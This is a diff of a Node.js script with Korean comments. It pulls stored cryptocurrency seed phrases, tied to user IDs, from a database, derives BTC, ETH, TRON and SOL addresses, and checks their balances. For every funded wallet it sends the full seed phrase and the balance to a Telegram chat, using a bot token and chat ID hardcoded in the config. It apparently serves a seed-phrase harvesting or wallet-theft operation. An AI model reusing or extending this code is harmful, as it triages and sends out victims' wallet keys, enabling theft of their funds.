@@ -1,540 +1,406 @@
 /**
- * 🔍 시드 문구 잔고 검수 시스템
- * 
- * 기능:
- * - DB에서 검수 안 된 시드 문구 조회
- * - 시드 문구로부터 지갑 주소 생성 및 잔고 확인
- * - 잔고가 0 이상이면 텔레그램 알림 (시드 문구 + 잔고)
- * - 검수 완료 처리
+ * 🔍 시드 문구 잔고 검수 시스템 (JS 버전 — seed_checker.py 동일 기능)
+ *
+ * 지원 체인: BTC / ETH / TRON / SOL
+ * DB 저장: seeds.btc, eth, tron, sol, balance, usdt_balance, checked, checked_at
  */
 
-const cron = require('node-cron');
-const axios = require('axios');
-const ethers = require('ethers');
-const TronWeb = require('tronweb');
-const db = require('./db');
+'use strict';
 
-// ========================================
-// 🔧 설정
-// ========================================
+const cron    = require('node-cron');
+const axios   = require('axios');
+const ethers  = require('ethers');
+const crypto  = require('crypto');
+const db      = require('./db');
 
+// ─────────────────────────────────────────
+//  설정
+// ─────────────────────────────────────────
 const CONFIG = {
-  // 텔레그램 봇 설정
-  TELEGRAM_BOT_TOKEN: '8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ',
-  TELEGRAM_CHAT_ID: '-1003732339035',
-  
-  // 스캔 주기 (기본: 30초마다)
-  CRON_SCHEDULE: process.env.SEED_CRON_SCHEDULE || '*/30 * * * * *',
-  
-  // 한 번에 처리할 시드 개수
-  BATCH_SIZE: 1,
-  
-  // RPC 엔드포인트 (무료 공개 RPC)
-  RPC_URLS: {
-    ethereum: 'https://rpc.flashbots.net',
-    bsc: 'https://bsc-dataseed1.binance.org',
-    polygon: 'https://polygon.drpc.org',
-    // tron: 'https://api.trongrid.io',  // TronWeb 버전 호환성 문제로 임시 비활성화
-  },
-  
-  // USDT 컨트랙트 주소
-  USDT_CONTRACTS: {
-    ethereum: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // ERC20 USDT
-    bsc: '0x55d398326f99059fF775485246999027B3197955',      // BEP20 USDT
-    polygon: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',    // Polygon USDT (USDT.e)
-    tron: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',            // TRC20 USDT
-  },
-  
-  // 최소 알림 잔고 (ETH 기준)
-  MIN_BALANCE: 0,
+  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ',
+  TELEGRAM_CHAT_ID:   process.env.TELEGRAM_CHAT_ID   || '-1003732339035',
+  CRON_SCHEDULE:      process.env.SEED_CRON_SCHEDULE  || '*/30 * * * * *',
+  BATCH_SIZE:         parseInt(process.env.SEED_BATCH_SIZE    || '1'),
+  MIN_BALANCE:        0,
 };
 
-// ========================================
-// 💾 처리 이력
-// ========================================
+// ─────────────────────────────────────────
+//  Base58 / Base58Check (BTC P2PKH, TRON 주소용)
+// ─────────────────────────────────────────
+const B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 
-const processedSeeds = new Set();
+function base58Encode(buf) {
+  let n = BigInt('0x' + buf.toString('hex') || '00');
+  let result = '';
+  const base = 58n;
+  while (n > 0n) {
+    result = B58_CHARS[Number(n % base)] + result;
+    n /= base;
+  }
+  for (const b of buf) {
+    if (b !== 0) break;
+    result = '1' + result;
+  }
+  return result;
+}
 
-// ========================================
-// 📨 텔레그램 전송 함수
-// ========================================
+function base58CheckEncode(versionByte, payload) {
+  const data = Buffer.concat([Buffer.from([versionByte]), payload]);
+  const checksum = crypto.createHash('sha256')
+    .update(crypto.createHash('sha256').update(data).digest()).digest().slice(0, 4);
+  return base58Encode(Buffer.concat([data, checksum]));
+}
 
-async function sendTelegram(message) {
+// ─────────────────────────────────────────
+//  RIPEMD-160 (BTC hash160용)
+//  — @noble/hashes 우선, 없으면 Node.js crypto fallback
+// ─────────────────────────────────────────
+let _ripemd160;
+try {
+  const { ripemd160 } = require('@noble/hashes/ripemd160');
+  _ripemd160 = (d) => Buffer.from(ripemd160(d));
+} catch {
+  _ripemd160 = (d) => crypto.createHash('ripemd160').update(d).digest();
+}
+
+function hash160(data) {
+  const sha = crypto.createHash('sha256').update(data).digest();
+  return _ripemd160(sha);
+}
+
+// ─────────────────────────────────────────
+//  ed25519-hd-key (SOL 파생용)
+// ─────────────────────────────────────────
+let ed25519HdKey = null;
+try { ed25519HdKey = require('ed25519-hd-key'); } catch { /* SOL 스킵 */ }
+
+// ─────────────────────────────────────────
+//  텔레그램
+// ─────────────────────────────────────────
+async function sendTelegram(message, botToken, chatId) {
+  const token = botToken || CONFIG.TELEGRAM_BOT_TOKEN;
+  const chat  = chatId   || CONFIG.TELEGRAM_CHAT_ID;
   try {
-    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const response = await axios.post(url, {
-      chat_id: CONFIG.TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML',
-    });
-    
-    if (response.data.ok) {
-      console.log('✅ 텔레그램 전송 성공');
-      return true;
-    } else {
-      console.error('❌ 텔레그램 전송 실패:', response.data);
-      return false;
-    }
-  } catch (error) {
-    console.error('❌ 텔레그램 전송 오류:', error.message);
+    const res = await axios.post(
+      `https://api.telegram.org/bot${token}/sendMessage`,
+      { chat_id: chat, text: message, parse_mode: 'HTML' },
+      { timeout: 10000 }
+    );
+    if (res.data.ok) { console.log('✅ 텔레그램 전송 성공'); return true; }
+    console.error('❌ 텔레그램 전송 실패:', res.data);
+    return false;
+  } catch (e) {
+    console.error('❌ 텔레그램 전송 오류:', e.message);
     return false;
   }
 }
 
-// ========================================
-// 🔍 잔고 확인 함수
-// ========================================
-
-async function checkBalance(seedPhrase, network = 'ethereum') {
+// ─────────────────────────────────────────
+//  BTC 잔고 확인  (m/44'/0'/0'/0/0 → P2PKH)
+// ─────────────────────────────────────────
+async function checkBtc(phrase) {
   try {
-    // Tron은 별도 처리
-    if (network === 'tron') {
-      return await checkTronBalance(seedPhrase);
+    const wallet = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/0'/0'/0/0");
+    const compressedPub = Buffer.from(wallet.publicKey.slice(2), 'hex'); // 33 bytes
+    const address = base58CheckEncode(0x00, hash160(compressedPub));
+    console.log(`[BTC] Address: ${address}`);
+
+    const apis = [
+      `https://blockstream.info/api/address/${address}`,
+      `https://mempool.space/api/address/${address}`,
+    ];
+
+    for (const url of apis) {
+      try {
+        const { data } = await axios.get(url, { timeout: 10000 });
+        const confirmed   = (data.chain_stats?.funded_txo_sum   || 0) - (data.chain_stats?.spent_txo_sum   || 0);
+        const unconfirmed = (data.mempool_stats?.funded_txo_sum || 0) - (data.mempool_stats?.spent_txo_sum || 0);
+        const btc = (confirmed + unconfirmed) / 1e8;
+        console.log(`[BTC] Balance: ${btc} BTC`);
+        return { network: 'btc', symbol: 'BTC', address, balance: btc };
+      } catch (e) {
+        console.log(`[BTC] API 실패: ${url} → ${e.message}`);
+      }
     }
-    
-    // 시드 문구로부터 지갑 생성
-    const wallet = ethers.Wallet.fromPhrase(seedPhrase);
+    throw new Error('BTC API 전부 실패');
+  } catch (e) {
+    console.error('[BTC] 오류:', e.message);
+    return { network: 'btc', symbol: 'BTC', address: '', balance: 0, error: e.message };
+  }
+}
+
+// ─────────────────────────────────────────
+//  ETH 잔고 확인  (m/44'/60'/0'/0/0)
+// ─────────────────────────────────────────
+async function checkEth(phrase) {
+  try {
+    const wallet  = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/60'/0'/0/0");
     const address = wallet.address;
-    
-    // RPC 프로바이더 생성 (타임아웃 설정)
-    const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URLS[network], null, {
-      staticNetwork: true, // 네트워크 감지 스킵
-      timeout: 10000, // 10초 타임아웃
-    });
-    
-    // 네이티브 토큰 잔고 조회
-    const balance = await provider.getBalance(address);
-    const balanceInEth = ethers.formatEther(balance);
-    
-    // USDT 잔고 조회
-    let usdtBalance = '0';
-    try {
-      const usdtContract = CONFIG.USDT_CONTRACTS[network];
-      if (usdtContract) {
-        const contract = new ethers.Contract(
-          usdtContract,
-          ['function balanceOf(address) view returns (uint256)'],
-          provider
-        );
-        const usdtBal = await contract.balanceOf(address);
-        // USDT는 대부분 6 decimals
-        usdtBalance = ethers.formatUnits(usdtBal, 6);
+    console.log(`[ETH] Address: ${address}`);
+
+    const rpcs = [
+      'https://cloudflare-eth.com',
+      'https://ethereum-rpc.publicnode.com',
+      'https://rpc.ankr.com/eth',
+    ];
+
+    for (const rpc of rpcs) {
+      try {
+        const provider = new ethers.JsonRpcProvider(rpc, null, { staticNetwork: true, timeout: 10000 });
+        const bal = await provider.getBalance(address);
+        const eth = parseFloat(ethers.formatEther(bal));
+        console.log(`[ETH] Balance: ${eth} ETH`);
+        return { network: 'eth', symbol: 'ETH', address, balance: eth };
+      } catch (e) {
+        console.log(`[ETH] RPC 실패: ${rpc} → ${e.message}`);
       }
-    } catch (error) {
-      console.log(`⚠️  USDT 잔고 조회 실패 (${network}):`, error.message);
     }
-    
-    return {
-      success: true,
-      address,
-      balance: balanceInEth,
-      usdtBalance,
-      network,
-      wallet,
-    };
-  } catch (error) {
-    console.error(`❌ ${network.toUpperCase()} 잔고 확인 오류: ${error.message}`);
-    
-    // RPC 연결 오류인 경우 더 자세한 정보 출력
-    if (error.message.includes('network') || error.message.includes('timeout')) {
-      console.error(`   RPC URL: ${CONFIG.RPC_URLS[network]}`);
-      console.error(`   해결방법: RPC 엔드포인트를 확인하거나 다른 공개 RPC로 변경하세요.`);
-    }
-    
-    return {
-      success: false,
-      network,
-      error: error.message,
-    };
+    throw new Error('ETH RPC 전부 실패');
+  } catch (e) {
+    console.error('[ETH] 오류:', e.message);
+    return { network: 'eth', symbol: 'ETH', address: '', balance: 0, error: e.message };
   }
 }
 
-// ========================================
-// 🔍 Tron 잔고 확인 (TronWeb 사용)
-// ========================================
-
-async function checkTronBalance(seedPhrase) {
+// ─────────────────────────────────────────
+//  TRON 잔고 확인  (m/44'/195'/0'/0/0 → Base58Check 0x41)
+// ─────────────────────────────────────────
+async function checkTron(phrase) {
   try {
-    // 시드 문구로부터 개인키 생성
-    const hdNode = ethers.HDNodeWallet.fromPhrase(seedPhrase);
-    const privateKey = hdNode.privateKey.slice(2); // 0x 제거
-    
-    // TronWeb 인스턴스 생성
-    const tronWeb = new TronWeb({
-      fullHost: CONFIG.RPC_URLS.tron,
-      privateKey: privateKey,
-    });
-    
-    const address = tronWeb.defaultAddress.base58;
-    
-    // TRX 잔고 조회
-    const balance = await tronWeb.trx.getBalance(address);
-    const balanceInTrx = (balance / 1e6).toString(); // TRX는 6 decimals
-    
-    // USDT 잔고 조회 (TRC20)
-    let usdtBalance = '0';
-    try {
-      const contract = await tronWeb.contract().at(CONFIG.USDT_CONTRACTS.tron);
-      const usdtBal = await contract.balanceOf(address).call();
-      usdtBalance = (usdtBal / 1e6).toString(); // USDT는 6 decimals
-    } catch (error) {
-      console.log(`⚠️  USDT 잔고 조회 실패 (tron):`, error.message);
+    const wallet     = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/195'/0'/0/0");
+    const signingKey = new ethers.SigningKey(wallet.privateKey);
+    // uncompressedPub = "0x04" + 64 bytes → strip "0x04"
+    const pubBytes   = Buffer.from(signingKey.publicKey.slice(4), 'hex'); // 64 bytes
+    const keccak     = Buffer.from(ethers.keccak256(pubBytes).slice(2), 'hex'); // 32 bytes
+    const address    = base58CheckEncode(0x41, keccak.slice(12)); // last 20 bytes, prefix 0x41
+
+    console.log(`[TRON] Address: ${address}`);
+
+    const apis = [
+      'https://api.trongrid.io/wallet/getaccount',
+      'https://api.tronstack.io/wallet/getaccount',
+    ];
+
+    for (const url of apis) {
+      try {
+        const { data } = await axios.post(url, { address, visible: true }, { timeout: 10000 });
+        const trx = (data.balance || 0) / 1e6;
+        console.log(`[TRON] Balance: ${trx} TRX`);
+        return { network: 'tron', symbol: 'TRX', address, balance: trx };
+      } catch (e) {
+        console.log(`[TRON] API 실패: ${url} → ${e.message}`);
+      }
     }
-    
-    return {
-      success: true,
-      address,
-      balance: balanceInTrx,
-      usdtBalance,
-      network: 'tron',
-    };
-  } catch (error) {
-    console.error(`❌ TRON 잔고 확인 오류: ${error.message}`);
-    
-    if (error.message.includes('network') || error.message.includes('timeout')) {
-      console.error(`   RPC URL: ${CONFIG.RPC_URLS.tron}`);
-      console.error(`   해결방법: Tron RPC 엔드포인트를 확인하세요.`);
-    }
-    
-    return {
-      success: false,
-      network: 'tron',
-      error: error.message,
-    };
+    throw new Error('TRON API 전부 실패');
+  } catch (e) {
+    console.error('[TRON] 오류:', e.message);
+    return { network: 'tron', symbol: 'TRX', address: '', balance: 0, error: e.message };
   }
 }
 
-// ========================================
-// 🔍 멀티체인 잔고 확인
-// ========================================
-
-async function checkMultiChainBalance(seedPhrase) {
-  const results = [];
-  
-  for (const [network, rpcUrl] of Object.entries(CONFIG.RPC_URLS)) {
-    try {
-      const result = await checkBalance(seedPhrase, network);
-      
-      if (result.success) {
-        results.push({
-          network,
-          address: result.address,
-          balance: result.balance,
-          usdtBalance: result.usdtBalance || '0',
-          hasBalance: parseFloat(result.balance) > CONFIG.MIN_BALANCE || parseFloat(result.usdtBalance || 0) > CONFIG.MIN_BALANCE,
-        });
-      }
-    } catch (error) {
-      console.error(`❌ ${network} 체크 실패:`, error.message);
-    }
+// ─────────────────────────────────────────
+//  SOL 잔고 확인  (SLIP-0010 ed25519, m/44'/501'/0'/0')
+// ─────────────────────────────────────────
+async function checkSol(phrase) {
+  if (!ed25519HdKey) {
+    console.log('[SOL] ed25519-hd-key 없음, 스킵');
+    return { network: 'sol', symbol: 'SOL', address: '', balance: 0 };
   }
-  
+  try {
+    const mnemonicObj = ethers.Mnemonic.fromPhrase(phrase);
+    const seedBuf = Buffer.from(mnemonicObj.computeSeed()); // Uint8Array → Buffer
+    const seedHex = seedBuf.toString('hex');
+
+    const { key } = ed25519HdKey.derivePath("m/44'/501'/0'/0'", seedHex);
+    const pubKey  = ed25519HdKey.getPublicKey(key, false); // 32 bytes Uint8Array
+
+    // SOL 주소 = plain base58 (no checksum)
+    const address = base58Encode(Buffer.from(pubKey));
+    console.log(`[SOL] Address: ${address}`);
+
+    const { data } = await axios.post(
+      'https://api.mainnet-beta.solana.com',
+      { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address] },
+      { timeout: 10000 }
+    );
+    const sol = (data.result?.value || 0) / 1e9;
+    console.log(`[SOL] Balance: ${sol} SOL`);
+    return { network: 'sol', symbol: 'SOL', address, balance: sol };
+  } catch (e) {
+    console.error('[SOL] 오류:', e.message);
+    return { network: 'sol', symbol: 'SOL', address: '', balance: 0, error: e.message };
+  }
+}
+
+// ─────────────────────────────────────────
+//  멀티체인 검사
+// ─────────────────────────────────────────
+async function checkAllChains(phrase) {
+  const results = [];
+  for (const fn of [checkBtc, checkEth, checkTron, checkSol]) {
+    try { results.push(await fn(phrase)); }
+    catch (e) { console.error('체인 검사 오류:', e.message); }
+  }
   return results;
 }
 
-// ========================================
-// 📝 시드 검수 처리 함수
-// ========================================
+// checkMultiChainBalance 는 server.js 이전 참조용 alias
+const checkMultiChainBalance = checkAllChains;
 
-async function processSeed(seedData) {
-  const { id, user_id, phrase, created_at } = seedData;
-  
-  // 중복 처리 방지
-  const uniqueKey = `${id}:${phrase}`;
-  if (processedSeeds.has(uniqueKey)) {
-    return;
-  }
-  
-  console.log('');
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🔍 시드 검수 시작`);
-  console.log(`📋 ID: ${id} | 사용자: ${user_id}`);
-  console.log(`📝 시드 문구: ${phrase.substring(0, 40)}...`);
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  
-  try {
-    // 멀티체인 잔고 확인
-    const balanceResults = await checkMultiChainBalance(phrase);
-    
-    // 각 체인별 잔고 로그 출력
-    console.log('');
-    console.log('💰 체인별 잔고 확인 결과:');
-    console.log('');
-    
-    balanceResults.forEach(r => {
-      const symbol = getTokenSymbol(r.network);
-      const hasNative = parseFloat(r.balance) > 0;
-      const hasUsdt = parseFloat(r.usdtBalance) > 0;
-      
-      console.log(`🌐 ${r.network.toUpperCase().padEnd(10)} | 주소: ${r.address}`);
-      console.log(`   💵 ${symbol.padEnd(6)}: ${r.balance.padEnd(20)} ${hasNative ? '✅' : '⚪'}`);
-      console.log(`   💵 USDT  : ${r.usdtBalance.padEnd(20)} ${hasUsdt ? '✅' : '⚪'}`);
-      console.log('');
-    });
-    
-    // 잔고가 있는 체인 찾기
-    const chainsWithBalance = balanceResults.filter(r => r.hasBalance);
-    
-    // 최대 잔고를 가진 체인 찾기 (네이티브 토큰 기준)
-    let maxBalance = 0;
-    let maxUsdtBalance = 0;
-    balanceResults.forEach(r => {
-      const bal = parseFloat(r.balance);
-      const usdt = parseFloat(r.usdtBalance);
-      if (bal > maxBalance) maxBalance = bal;
-      if (usdt > maxUsdtBalance) maxUsdtBalance = usdt;
-    });
-    
-    // DB에 잔고 저장
-    await saveBalanceToDB(id, maxBalance, maxUsdtBalance);
-    
-    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-    console.log(`📊 검수 결과 요약:`);
-    console.log(`   최대 네이티브 잔고: ${maxBalance}`);
-    console.log(`   최대 USDT 잔고: ${maxUsdtBalance}`);
-    console.log(`   잔고 있는 체인: ${chainsWithBalance.length}개`);
-    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-    console.log('');
-    
-    if (chainsWithBalance.length > 0) {
-      // 잔고 발견!
-      console.log(`🎉 잔고 발견! ID: ${id}, 체인: ${chainsWithBalance.length}개`);
-      console.log('');
-      
-      // 텔레그램 메시지 작성
-      let message = `🚨 <b>잔고 발견!</b>\n\n`;
-      message += `👤 <b>사용자:</b> ${user_id}\n`;
-      message += `🆔 <b>시드 ID:</b> ${id}\n`;
-      message += `📅 <b>수신일:</b> ${new Date(created_at).toLocaleString('ko-KR')}\n\n`;
-      
-      chainsWithBalance.forEach(chain => {
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `🌐 <b>${chain.network.toUpperCase()}</b>\n`;
-        message += `💰 <b>잔고:</b> ${chain.balance} ${getTokenSymbol(chain.network)}\n`;
-        if (parseFloat(chain.usdtBalance) > 0) {
-          message += `💵 <b>USDT:</b> ${chain.usdtBalance} USDT\n`;
-        }
-        message += `🔑 <b>주소:</b> <code>${chain.address}</code>\n`;
-      });
-      
-      message += `\n━━━━━━━━━━━━━━━━━━\n`;
-      message += `📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n`;
-      message += `━━━━━━━━━━━━━━━━━━`;
-      
-      // 텔레그램 전송
-      console.log('📨 텔레그램 알림 전송 중...');
-      const sent = await sendTelegram(message);
-      
-      if (sent) {
-        console.log('✅ 텔레그램 알림 전송 성공!');
-        // 검수 완료 처리 (DB에 플래그 추가)
-        await markAsChecked(id);
-        processedSeeds.add(uniqueKey);
-      } else {
-        console.log('❌ 텔레그램 알림 전송 실패!');
-      }
-    } else {
-      console.log(`📭 잔고 없음. ID: ${id}`);
-      // 잔고가 없어도 검수 완료 처리
-      await markAsChecked(id);
-      processedSeeds.add(uniqueKey);
-    }
-    
-    console.log('✅ 검수 완료!');
-    console.log('');
-  } catch (error) {
-    console.error(`❌ 시드 처리 오류 (ID: ${id}):`, error.message);
-    console.log('');
-  }
-}
-
-// ========================================
-// 🏷️ 토큰 심볼 반환
-// ========================================
-
-function getTokenSymbol(network) {
-  const symbols = {
-    ethereum: 'ETH',
-    bsc: 'BNB',
-    polygon: 'MATIC',
-    tron: 'TRX',
-  };
-  return symbols[network] || network.toUpperCase();
-}
-
-// ========================================
-// 💾 DB에 잔고 저장
-// ========================================
-
-async function saveBalanceToDB(seedId, balance, usdtBalance) {
+// ─────────────────────────────────────────
+//  DB 저장 (btc/eth/tron/sol 각각 + balance/usdt_balance)
+// ─────────────────────────────────────────
+async function saveBalanceToDB(seedId, btc, eth, tron, sol) {
+  const maxBalance = Math.max(btc, eth, tron, sol, 0);
   try {
     await db.pool.query(
-      'UPDATE seeds SET balance = ?, usdt_balance = ? WHERE id = ?',
-      [balance, usdtBalance, seedId]
+      `UPDATE seeds SET balance=?, btc=?, eth=?, tron=?, sol=? WHERE id=?`,
+      [maxBalance, btc || null, eth || null, tron || null, sol || null, seedId]
     );
-    console.log(`💾 잔고 저장: ID ${seedId}, Balance: ${balance}, USDT: ${usdtBalance}`);
-  } catch (error) {
-    console.error(`❌ 잔고 저장 실패 (ID: ${seedId}):`, error.message);
+    console.log(`💾 DB 저장: ID=${seedId} BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
+  } catch (e) {
+    console.error('❌ DB 저장 실패:', e.message);
   }
 }
-
-// ========================================
-// ✅ 검수 완료 처리
-// ========================================
 
 async function markAsChecked(seedId) {
   try {
-    await db.pool.query(
-      'UPDATE seeds SET checked = TRUE, checked_at = NOW() WHERE id = ?',
-      [seedId]
-    );
-    console.log(`✅ 검수 완료 처리: ID ${seedId}`);
-  } catch (error) {
-    console.error(`❌ 검수 완료 처리 실패 (ID: ${seedId}):`, error.message);
+    await db.pool.query('UPDATE seeds SET checked=1, checked_at=NOW() WHERE id=?', [seedId]);
+    console.log(`✅ 검수 완료 처리: ID=${seedId}`);
+  } catch (e) {
+    console.error('❌ 검수 완료 처리 실패:', e.message);
   }
 }
 
-// ========================================
-// 📂 DB에서 미검수 시드 조회
-// ========================================
+// ─────────────────────────────────────────
+//  시드 한 개 처리 (seeds 테이블)
+// ─────────────────────────────────────────
+async function processSeed(seedData) {
+  const { id, user_id, phrase, created_at } = seedData;
+  console.log(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  console.log(`🔍 시드 검수 시작 (ID=${id}, 사용자=${user_id})`);
 
+  try {
+    const results = await checkAllChains(phrase);
+
+    const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
+    const btc  = getbal('btc');
+    const eth  = getbal('eth');
+    const tron = getbal('tron');
+    const sol  = getbal('sol');
+
+    await saveBalanceToDB(id, btc, eth, tron, sol);
+
+    const chainsWithBalance = results.filter(r => (r.balance || 0) > CONFIG.MIN_BALANCE);
+
+    console.log(`📊 요약: BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} (잔고 있는 체인: ${chainsWithBalance.length}개)`);
+
+    if (chainsWithBalance.length > 0) {
+      let msg = `🚨 <b>잔고 발견!</b>\n\n`;
+      msg += `👤 <b>사용자:</b> ${user_id}\n`;
+      msg += `🆔 <b>시드 ID:</b> ${id}\n`;
+      const dt = created_at instanceof Date ? created_at.toISOString().replace('T', ' ').slice(0, 19) : String(created_at);
+      msg += `📅 <b>수신일:</b> ${dt}\n\n`;
+
+      for (const c of chainsWithBalance) {
+        msg += `━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🌐 <b>${c.network.toUpperCase()}</b>\n`;
+        msg += `💰 <b>잔고:</b> ${c.balance} ${c.symbol}\n`;
+        if (c.address) msg += `🔑 <b>주소:</b> <code>${c.address}</code>\n`;
+      }
+      msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n━━━━━━━━━━━━━━━━━━`;
+
+      await sendTelegram(msg);
+    } else {
+      console.log(`📭 잔고 없음 (ID=${id})`);
+    }
+
+    await markAsChecked(id);
+  } catch (e) {
+    console.error(`❌ 시드 처리 오류 (ID=${id}):`, e.message);
+  }
+}
+
+// ─────────────────────────────────────────
+//  DB에서 미검수 시드 조회
+// ─────────────────────────────────────────
 async function getUncheckedSeeds() {
   try {
     const [rows] = await db.pool.query(
-      `SELECT id, user_id, phrase, created_at 
-       FROM seeds 
-       WHERE checked IS NULL OR checked = FALSE 
-       ORDER BY created_at ASC 
+      `SELECT id, user_id, phrase, created_at
+       FROM seeds
+       WHERE (checked IS NULL OR checked = 0)
+          OR btc IS NULL OR eth IS NULL OR tron IS NULL OR sol IS NULL
+       ORDER BY created_at ASC
        LIMIT ?`,
       [CONFIG.BATCH_SIZE]
     );
     return rows;
-  } catch (error) {
-    console.error('❌ DB 조회 오류:', error.message);
+  } catch (e) {
+    console.error('❌ DB 조회 오류:', e.message);
     return [];
   }
 }
 
-// ========================================
-// 🔄 스케줄러 작업
-// ========================================
-
+// ─────────────────────────────────────────
+//  스케줄러
+// ─────────────────────────────────────────
 async function runCheck() {
   try {
-    // 미검수 시드 조회
     const seeds = await getUncheckedSeeds();
-    
     if (seeds.length === 0) {
-      console.log(`📭 미검수 시드 없음 (${new Date().toLocaleString('ko-KR')})`);
+      console.log(`📭 미검수 시드 없음 (${new Date().toISOString()})`);
       return;
     }
-    
     console.log(`🔍 ${seeds.length}개 시드 검수 시작...`);
-    
-    // 순차적으로 처리
     for (const seed of seeds) {
       await processSeed(seed);
-      
-      // API 레이트 리밋 방지 (1초 대기)
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      await new Promise(r => setTimeout(r, 1000));
     }
-    
     console.log(`✅ 검수 완료 (${seeds.length}개)`);
-  } catch (error) {
-    console.error('❌ 스케줄러 오류:', error.message);
+  } catch (e) {
+    console.error('❌ 스케줄러 오류:', e.message);
   }
 }
 
-// ========================================
-// 🗄️ DB 테이블 업데이트 (checked 컬럼 추가)
-// ========================================
-
+// ─────────────────────────────────────────
+//  스키마 확인 (checked 컬럼)
+// ─────────────────────────────────────────
 async function ensureCheckedColumn() {
   try {
-    // checked 컬럼 존재 확인
-    const [columns] = await db.pool.query(
-      "SHOW COLUMNS FROM seeds LIKE 'checked'"
-    );
-    
-    if (columns.length === 0) {
-      // checked 컬럼 추가
-      await db.pool.query(
-        'ALTER TABLE seeds ADD COLUMN checked BOOLEAN DEFAULT FALSE'
-      );
-      await db.pool.query(
-        'ALTER TABLE seeds ADD COLUMN checked_at DATETIME'
-      );
+    const [cols] = await db.pool.query("SHOW COLUMNS FROM seeds LIKE 'checked'");
+    if (cols.length === 0) {
+      await db.pool.query('ALTER TABLE seeds ADD COLUMN checked BOOLEAN DEFAULT FALSE');
+      await db.pool.query('ALTER TABLE seeds ADD COLUMN checked_at DATETIME');
       console.log('✅ seeds 테이블에 checked 컬럼 추가됨');
-    } else {
-      console.log('✅ seeds 테이블 스키마 확인 완료');
     }
-  } catch (error) {
-    console.error('❌ 테이블 스키마 업데이트 실패:', error.message);
-    throw error;
+  } catch (e) {
+    console.error('❌ 테이블 스키마 업데이트 실패:', e.message);
   }
 }
 
-// ========================================
-// 🚀 메인 실행
-// ========================================
-
+// ─────────────────────────────────────────
+//  메인
+// ─────────────────────────────────────────
 async function main() {
-  console.log('');
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log('🔍 시드 문구 잔고 검수 시스템 시작');
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  console.log('🔍 시드 문구 잔고 검수 시스템 시작 (JS)');
   console.log(`📨 텔레그램 채팅: ${CONFIG.TELEGRAM_CHAT_ID}`);
   console.log(`⏱️  스케줄: ${CONFIG.CRON_SCHEDULE}`);
-  console.log(`📦 배치 크기: ${CONFIG.BATCH_SIZE}개`);
-  console.log(`💵 최소 잔고: ${CONFIG.MIN_BALANCE}`);
-  console.log(`🌐 지원 체인: ${Object.keys(CONFIG.RPC_URLS).join(', ')}`);
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log('');
-  
-  // DB 연결 확인
-  try {
-    await db.seedDB.getAll();
-    console.log('✅ MariaDB 연결 확인');
-  } catch (error) {
-    console.error('❌ MariaDB 연결 실패:', error.message);
-    process.exit(1);
-  }
-  
-  // 테이블 스키마 확인 및 업데이트
-  await ensureCheckedColumn();
-  
-  // 텔레그램 테스트
-  console.log('📨 텔레그램 연결 테스트 중...');
-  const testResult = await sendTelegram('✅ 시드 문구 검수 시스템이 시작되었습니다!');
-  
-  if (!testResult) {
-    console.error('❌ 텔레그램 연결 실패! 봇 토큰과 채팅 ID를 확인하세요.');
-    process.exit(1);
-  }
-  
-  console.log('');
-  console.log('🎯 검수 시작... (Ctrl+C로 종료)');
-  console.log('');
-  
-  // 즉시 첫 검수 실행
-  await runCheck();
-  
-  // 스케줄러 시작
-  cron.schedule(CONFIG.CRON_SCHEDULE, async () => {
-    await runCheck();
-  });
-}
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
 
-// ========================================
-// 🎬 실행
-// ========================================
+  await ensureCheckedColumn();
+
+  const testOk = await sendTelegram('✅ 시드 문구 검수 시스템(JS)이 시작되었습니다!');
+  if (!testOk) { console.error('❌ 텔레그램 연결 실패'); process.exit(1); }
+
+  await runCheck();
+
+  cron.schedule(CONFIG.CRON_SCHEDULE, runCheck);
+}
 
 if (require.main === module) {
-  main().catch(error => {
-    console.error('❌ 치명적 오류:', error);
-    process.exit(1);
-  });
+  main().catch(e => { console.error('❌ 치명적 오류:', e); process.exit(1); });
 }
 
-module.exports = { checkBalance, checkMultiChainBalance, processSeed };
-
+module.exports = { checkBtc, checkEth, checkTron, checkSol, checkAllChains, checkMultiChainBalance, processSeed };
